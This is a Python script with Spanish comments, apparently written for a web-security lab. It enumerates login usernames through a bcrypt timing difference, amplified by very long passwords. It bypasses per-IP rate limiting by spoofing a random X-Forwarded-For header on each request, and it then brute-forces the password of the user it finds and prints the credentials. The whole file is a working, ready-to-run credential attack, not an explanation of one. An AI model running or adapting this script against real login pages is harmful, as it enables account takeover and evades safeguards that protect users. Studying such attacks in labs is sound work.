#!/usr/bin/env python3
"""
Username enumeration por TIMING differential + bypass de rate-limit con X-Forwarded-For.

El server responde body/status idéntico para username válido vs inválido. Pero
hashea con bcrypt sólo si el user existe; con un password muy largo, el costo
del hash es el oracle: válido tarda segundos, inválido vuelve en ms.

El server también rate-limita por IP. Cada request lleva X-Forwarded-For con
IP random para que parezca venir de un cliente distinto.

Uso:
    python3 bruteforce.py <lab-host> <usernames-file> <passwords-file>
"""
import argparse
import random
import statistics
import sys
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


def random_ip() -> str:
    return f"{random.randint(1, 254)}.{random.randint(0, 254)}.{random.randint(0, 254)}.{random.randint(1, 254)}"


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 timing-attack",
    })
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_maxsize=64))
    return s


def attempt_login(session, host, username, password):
    body = urlencode({"username": username, "password": password})
    headers = {"X-Forwarded-For": random_ip()}
    t0 = time.time()
    r = session.post(f"https://{host}/login", data=body, headers=headers, timeout=30, allow_redirects=False)
    elapsed = time.time() - t0
    return r.status_code, len(r.content), elapsed


def phase1_enum_username(session, host, usernames, long_pwd, workers, trials):
    print(f"\n[*] Fase 1 (enum por timing): {len(usernames)} usernames x {trials} trials (workers={workers})", file=sys.stderr)
    print(f"[*] password length: {len(long_pwd)} bytes (amplifica bcrypt si user existe)", file=sys.stderr)
    print(f"[*] X-Forwarded-For random por request (bypass rate-limit por IP)", file=sys.stderr)

    def probe(u):
        times = []
        for _ in range(trials):
            try:
                _, _, elapsed = attempt_login(session, host, u, long_pwd)
                times.append(elapsed)
            except requests.RequestException:
                times.append(None)
        valid_times = [t for t in times if t is not None]
        if not valid_times:
            return u, None
        return u, statistics.median(valid_times)

    results = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe, u): u for u in usernames}
        for fut in as_completed(futures):
            u, median_time = fut.result()
            if median_time is not None:
                results.append((u, median_time))

    # ordenar por tiempo descendente
    results.sort(key=lambda x: -x[1])

    times = [t for _, t in results]
    median_all = statistics.median(times)
    p95 = statistics.quantiles(times, n=20)[18] if len(times) >= 20 else max(times)

    print(f"[*] median time global: {median_all*1000:.0f}ms", file=sys.stderr)
    print(f"[*] p95: {p95*1000:.0f}ms", file=sys.stderr)
    print(f"[*] top 5 (mas lentos):", file=sys.stderr)
    for u, t in results[:5]:
        print(f"    {u:<25} {t*1000:.0f}ms", file=sys.stderr)
    print(f"[*] bottom 3 (mas rapidos):", file=sys.stderr)
    for u, t in results[-3:]:
        print(f"    {u:<25} {t*1000:.0f}ms", file=sys.stderr)

    return results


def phase2_bruteforce_password(session, host, valid_user, passwords, workers):
    print(f"\n[*] Fase 2 (brute pwd para {valid_user}): {len(passwords)} candidatos (workers={workers})", file=sys.stderr)

    def probe(p):
        try:
            status, length, _ = attempt_login(session, host, valid_user, p)
            return p, status, length
        except requests.RequestException as e:
            return p, -1, 0

    results = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe, p): p for p in passwords}
        for fut in as_completed(futures):
            results.append(fut.result())

    fp_counter = Counter((s, l) for _, s, l in results)
    common_fp = fp_counter.most_common(1)[0][0]
    print(f"[*] distribucion (status,length): top={fp_counter.most_common(3)}", file=sys.stderr)

    redirects = [(p, s, l) for p, s, l in results if s == 302]
    if redirects:
        return redirects[0][0]

    outliers = [(p, s, l) for p, s, l in results if (s, l) != common_fp]
    if outliers:
        print(f"[!] {len(outliers)} outliers no-302, primeros:", file=sys.stderr)
        for p, s, l in outliers[:5]:
            print(f"    pwd={p!r:<20} status={s} len={l}", file=sys.stderr)
    return None


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("usernames_file")
    p.add_argument("passwords_file")
    p.add_argument("--workers-phase1", type=int, default=8, help="threads en fase 1; bajos para timing accuracy")
    p.add_argument("--workers-phase2", type=int, default=20)
    p.add_argument("--trials", type=int, default=3, help="trials por username en fase 1")
    p.add_argument("--pwd-bytes", type=int, default=50000, help="bytes de A para amplificar bcrypt")
    args = p.parse_args()

    with open(args.usernames_file) as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(args.passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    long_pwd = "A" * args.pwd_bytes
    session = make_session()

    timed_results = phase1_enum_username(session, args.host, usernames, long_pwd, args.workers_phase1, args.trials)
    if not timed_results:
        print("[!] no results en fase 1", file=sys.stderr)
        return 1

    valid_user = timed_results[0][0]
    print(f"\n[+] candidato (slowest): {valid_user}  ({timed_results[0][1]*1000:.0f}ms)", file=sys.stderr)

    valid_pwd = phase2_bruteforce_password(session, args.host, valid_user, passwords, args.workers_phase2)
    if not valid_pwd:
        print(f"[!] no encontre password para {valid_user}. probar el segundo candidato manualmente:", file=sys.stderr)
        for u, t in timed_results[1:5]:
            print(f"    {u:<25} {t*1000:.0f}ms", file=sys.stderr)
        return 1

    print(f"\n[+] credenciales: {valid_user}:{valid_pwd}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
